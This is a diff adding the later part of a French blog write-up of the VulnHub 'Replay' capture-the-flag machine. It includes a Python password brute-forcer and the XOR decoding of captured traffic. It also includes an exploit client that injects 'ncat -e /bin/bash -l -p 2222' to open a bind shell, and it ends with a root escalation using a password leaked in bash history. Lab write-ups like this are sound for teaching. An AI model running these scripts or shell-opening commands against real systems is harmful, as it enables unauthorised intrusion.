@@ -117,6 +117,158 @@ Sans trop de difficultés on devine qu'une fois que le serveur a envoyé la cha�
 
 Le client envoie ensuite un padding composé des caractères 0 jusqu'à obtenir l'équivalent de 30 envois.  
 
+Plus tard le client envoie une valeur en base64 mais c'est déjà trop tard car on a déjà reçu un message d'échec à ce stade...  
 
+On peut tenter de brute-forcer le mot de passe avec un script maison :  
+
+```python
+import socket
+from time import sleep
+import sys
+
+wordlist = sys.argv[1]
+with open(wordlist) as fd:
+    for line in fd:
+        line = line.strip()
+        if len(line) > 31:
+            continue
+
+        try:
+            sock = socket.socket()
+            sock.connect(('192.168.2.2', 1337))
+            sock.recv(5)
+            sock.recv(1)
+            for char in line.ljust(30, '\0'):
+                sleep(.01)
+                sock.send(str(ord(char)).encode())
+            buff = sock.recv(1024)
+            if b"Auth Failed" not in buff:
+                print(buff)
+                print("Found password", line)
+                exit()
+
+            sock.close()
+            sleep(.01)
+        except:
+            print(line)
+            exit()
+```
+
+Mais cela ne mène nul part.  
+
+Il faut donc faire avec les informations à disposition. D'un côté on a ce *P1* trouvé dans le HTML qui signifie certainement partie 1 et une note dans le binaire donnant une seconde partie... il nous suffit de recoller les morceaux :)  
+
+On relance le client avec le bon mot de passe et l'authentification passe. La commande par défaut (le *echo* avec le *whoami*) est bien exécutée. Maintenant il faut pouvoir exécuter les commandes de notre choix et ce sans éditer le binaire.  
+
+Si on regarde la nouvelle capture on remarque une vérification assez basique pour l'étape 2 : le serveur envoie une chaîne base64 et on doit envoyer la valeur décodée.  
+
+![VulnHub Replay CTF first trafic analysis](https://raw.githubusercontent.com/devl00p/blog/master/images/vulnhub/replay_trafic2.png)
+
+L'étape 3 consiste pour le client à envoyer une valeur correspondant à un octet encodé en base64. Puis il envoie un bloc de données plus gros au serveur.  
+
+Vu qu'il est mention de *XOR* dans le binaire ça parait évident que l'octet est la clé qui va servir au serveur à décoder le bloc.  
+
+Pour s'en convaincre on récupère ces données (depuis Wireshark on fait *Suivre > Flux TCP > Tableaux C* pour avoir un format plus facilement exploitable).  
+
+La clé ici correspond au caractère *x* soit 120 en décimal.  
+
+```python
+>>> t = [0x48, 0x48, 0x19, 0x1c, 0x15, 0x11, 0x16, 0x1b, 
+... 0x15, 0x1c, 0x43, 0x1d, 0x1b, 0x10, 0x17, 0x58, 
+... 0x30, 0x1d, 0x14, 0x14, 0x17, 0x58, 0x2f, 0x17, 
+... 0x0a, 0x14, 0x1c, 0x54, 0x58, 0x01, 0x17, 0x0d, 
+... 0x58, 0x19, 0x0a, 0x1d, 0x58, 0x1b, 0x0d, 0x0a, 
+... 0x0a, 0x1d, 0x16, 0x0c, 0x14, 0x01, 0x58, 0x0a, 
+... 0x0d, 0x16, 0x16, 0x11, 0x16, 0x1f, 0x58, 0x19, 
+... 0x0b, 0x42, 0x58, 0x43, 0x0f, 0x10, 0x17, 0x19, 
+... 0x15, 0x11]
+>>> "".join([chr(x ^ 120) for x in t])
+'00admincmd;echo Hello World, you are currently running as: ;whoami'
+```
+
+En conclusion l'exécution des commandes n'est possible que si elles sont précédées de la chaîne *00admincmd;*.  
+
+Armé de tout ça il est facile d'écrire un client pour exécuter nos commandes et vu que l'on spécifie la clé pour le XOR on passera 0 ce qui permettra d'envoyer les commandes en clair.  
+
+Le script suivant met en écoute un shell sur la machine (on profite que les ports ne soient pas filtrés) :  
+
+```python
+import socket
+from time import sleep
+from base64 import b64decode, b64encode
+
+def recv_until(sock, expected):
+    buff = b""
+    while True:
+        buff += sock.recv(1024)
+        if expected in buff:
+            return buff
+
+sock = socket.socket()
+sock.connect(('192.168.2.2', 1337))
+recv_until(sock, b"CH1:")
+for char in "qGQjwO4h6gh0TAIRNXuQcDu9Lqsyul":
+    sock.send(str(ord(char)).encode())
+    sleep(.05)
+
+buff = recv_until(sock, b"CH2:").decode()
+buff = buff.strip().replace("\n", "").split("CH2:")[1]
+buff = b64decode(buff)
+sock.send(buff)
+recv_until(sock, b"CH3:")
+sock.send(b64encode(b"\0"))
+recv_until(sock, b"Enter a Command:")
+sock.send(b"00admincmd;ncat -e /bin/bash -l -p 2222;")
+buff = recv_until(sock, b"Command Executed").decode().strip()
+print(buff)
+sock.close()
+```
+
+Arrivée d'air chaud
+-------------------
+
+Une fois notre shell obtenu on remarque un historique bash assez chargé pour notre utilisateur *bob*.  
+
+Les lignes suivantes sont particulièrement intéressantes :  
+
+```bash
+cd Documents/
+cd .ftp
+nano users.passwd
+```
+
+Ce fichier contient la ligne suivante :  
+
+```plain
+bob:b0bcat_1234567890:1100:1100::/ftp:/bin/false
+```
+
+Ce mot de passe permet de passer root via *sudo su* et ainsi obtenir le contenu de */flag.txt* :  
+
+```plain
+                   __
+                  / \--..____
+                   \ \       \-----,,,..
+                    \ \       \         \--,,..
+                     \ \       \         \  ,'
+                      \ \       \         \ ``..
+                       \ \       \         \-''
+                        \ \       \__,,--'''
+                         \ \       \.
+                          \ \      ,/
+                           \ \__..-
+                            \ \
+                             \ \
+                              \ \   
+                               \ \
+                                \ \
+                                 \ \
+                                  \ \
+                                   \ \
+Congrats on getting root!           \ \
+~c0rruptedb1t                        \ \
+```
+
+Assez amusant sans être extra, l'escalade de privilèges aurait pu être plus corsée.
 
 *Published July 19 2019 at 18:49*
